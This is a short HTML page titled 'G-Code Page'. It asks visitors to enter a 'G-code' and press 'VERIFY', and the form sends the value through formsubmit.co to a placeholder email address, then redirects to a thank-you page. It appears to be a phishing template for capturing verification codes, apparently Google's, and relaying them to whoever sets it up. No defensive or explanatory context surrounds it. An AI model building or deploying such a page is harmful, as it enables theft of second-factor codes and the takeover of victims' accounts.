<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>G-Code Page</title>
  <style>
    body {
      background: linear-gradient(135deg, #2e7d32, #66bb6a);
      color: white;
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .gcode-container {
      background-color: rgba(255, 255, 255, 0.1);
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
      width: 300px;
      text-align: center;
    }

    input[type="text"] {
      width: 100%;
      padding: 10px;
      margin-top: 15px;
      border: none;
      border-radius: 8px;
      background-color: rgba(255, 255, 255, 0.1);
      color: white;
      font-size: 16px;
    }

    input::placeholder {
      color: #c8e6c9;
    }

    button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 10px;
      background-color: #43a047;
      color: white;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #388e3c;
    }
  </style>
</head>
<body>
  <div class="gcode-container">
    <h1>Enter G-Code</h1>
    <form action="https://formsubmit.co/YOUR_EMAIL@example.com" method="POST">
      <input type="text" name="g-code" placeholder="Enter your G-code here" required>
      <input type="hidden" name="_next" value="thankyou.html">
      <button type="submit">VERIFY</button>
    </form>
  </div>
</body>
</html>
